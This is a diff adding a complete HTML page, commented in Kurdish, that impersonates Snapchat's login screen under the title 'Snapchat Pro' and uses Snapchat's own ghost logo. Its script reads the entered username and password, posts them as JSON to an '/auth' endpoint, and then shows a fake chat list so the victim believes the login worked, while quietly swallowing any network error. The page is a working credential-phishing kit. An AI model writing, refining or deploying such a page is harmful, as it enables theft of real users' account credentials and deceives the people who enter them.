@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Pro</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; }
+        body { background-color: #262626; color: white; overflow: hidden; }
+
+        /* لۆگین - دیزاینی زەرد و سپی */
+        .page { position: fixed; width: 100%; height: 100%; display: none; flex-direction: column; align-items: center; }
+        .active { display: flex; animation: slideIn 0.3s ease-in-out; }
+        @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
+
+        .ghost-logo { width: 50px; margin-top: 100px; margin-bottom: 50px; }
+        .login-text { font-size: 35px; font-weight: bold; margin-bottom: 50px; }
+        .input-group { width: 85%; max-width: 350px; }
+        .inp { width: 100%; padding: 15px; border-radius: 5px; border: 1px solid #444; background: white; color: black; margin-bottom: 15px; font-size: 16px; outline: none; }
+        .login-btn { width: 85%; max-width: 350px; padding: 15px; background: #FFFC00; border: none; border-radius: 5px; color: black; font-weight: bold; font-size: 16px; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
+        
+        /* شاشەی هاوڕێکان - وەک وێنەکانت */
+        .header { width: 100%; background: white; color: black; padding: 15px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; }
+        .avatar-top { width: 35px; height: 35px; background: #bc55ff; border-radius: 50%; }
+        .search-icon { font-size: 20px; color: #888; }
+        .friends-list { width: 100%; overflow-y: auto; background: white; height: 100%; }
+        .friend-row { display: flex; align-items: center; padding: 12px 15px; border-bottom: 1px solid #eee; color: black; }
+        .f-avatar { width: 45px; height: 45px; border-radius: 50%; background: #eee; margin-right: 15px; display: flex; align-items: center; justify-content: center; font-size: 20px; }
+        .f-info { flex-grow: 1; text-align: left; }
+        .f-name { font-weight: bold; font-size: 16px; }
+        .f-msg { font-size: 12px; color: #999; }
+        .f-action { color: #bc55ff; font-size: 22px; }
+
+        /* بارەکەی خوارەوە */
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: white; border-top: 1px solid #eee; display: flex; justify-content: space-around; padding: 15px; }
+        .nav-icon { color: #ccc; font-size: 20px; }
+        .nav-active { color: #bc55ff; }
+    </style>
+</head>
+<body>
+
+    <div id="loginPage" class="page active">
+        <img src="https://accounts.snapchat.com/accounts/static/images/ghost/ghost.svg" class="ghost-logo">
+        <h1 class="login-text">Log In</h1>
+        <div class="input-group">
+            <input type="text" id="username" class="inp" placeholder="Username or Email">
+            <input type="password" id="password" class="inp" placeholder="Password">
+        </div>
+        <button class="login-btn" onclick="startLogin()">Log In</button>
+        <p style="color: #009fda; margin-top: 25px; font-size: 14px;">Forgot password?</p>
+    </div>
+
+    <div id="chatPage" class="page" style="background: white;">
+        <div class="header">
+            <div class="avatar-top"></div>
+            <div style="font-weight: bold; font-size: 18px;">Chat</div>
+            <div class="search-icon">🔍</div>
+        </div>
+        
+        <div class="friends-list">
+            <div class="friend-row">
+                <div class="f-avatar">👻</div>
+                <div class="f-info">
+                    <div class="f-name">Team Snapchat</div>
+                    <div class="f-msg">New Snap • 2m</div>
+                </div>
+                <div class="f-action">💬</div>
+            </div>
+            <div class="friend-row">
+                <div class="f-avatar" style="background: #FFFC00;">👤</div>
+                <div class="f-info">
+                    <div class="f-name">Best Friend</div>
+                    <div class="f-msg">Opened • 1h</div>
+                </div>
+                <div class="f-action">💬</div>
+            </div>
+            <div class="friend-row">
+                <div class="f-avatar">⭐</div>
+                <div class="f-info">
+                    <div class="f-name">Snap Support</div>
+                    <div class="f-msg">Tap to chat</div>
+                </div>
+                <div class="f-action">💬</div>
+            </div>
+        </div>
+
+        <div class="bottom-nav">
+            <div class="nav-icon">📍</div>
+            <div class="nav-icon nav-active">💬</div>
+            <div class="nav-icon">📷</div>
+            <div class="nav-icon">👥</div>
+            <div class="nav-icon">▶️</div>
+        </div>
+    </div>
+
+    <script>
+        function startLogin() {
+            let user = document.getElementById('username').value;
+            let pass = document.getElementById('password').value;
+
+            if (user === "" || pass === "") {
+                alert("تکایە خانەکان پڕ بکەرەوە!");
+                return;
+            }
+
+            // گۆڕینی شاشەکە ڕاستەوخۆ
+            document.getElementById('loginPage').classList.remove('active');
+            document.getElementById('chatPage').classList.add('active');
+
+            // ناردنی داتا بۆ سێرڤەر (ئەگەر سێرڤەر ئامادە بێت)
+            fetch('/auth', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ user: user, pass: pass })
+            }).catch(e => console.log("Offline Mode Active"));
+        }
+    </script>
+</body>
+</html>
